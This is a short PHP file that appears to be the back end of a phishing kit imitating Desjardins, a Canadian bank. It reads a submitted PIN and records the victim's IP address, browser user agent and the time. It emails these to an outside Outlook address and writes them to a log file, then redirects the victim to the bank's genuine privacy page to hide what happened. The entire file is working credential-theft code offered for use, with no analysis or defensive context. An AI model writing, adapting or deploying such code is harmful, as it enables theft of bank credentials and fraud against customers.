<?php
$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");
$nip = $_POST['pass'];
$data ="
=============## DESJ ##==================
|P I N  ---->$nip
============## Goodies ##=======================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##DEJ #$browserAgent";

$emailusr = 'ventura514@outlook.com';

mail($emailusr, $subj, $data);

 $fp = fopen("logs.txt", "a");
 //write to the file
 fwrite($fp, $data);
 fclose($fp);

header("Location: https://www.desjardins.com/confidentialite/desjardins-securite-financiere/politique-gestion-protection-renseignements-personnels/index.jsp");

?>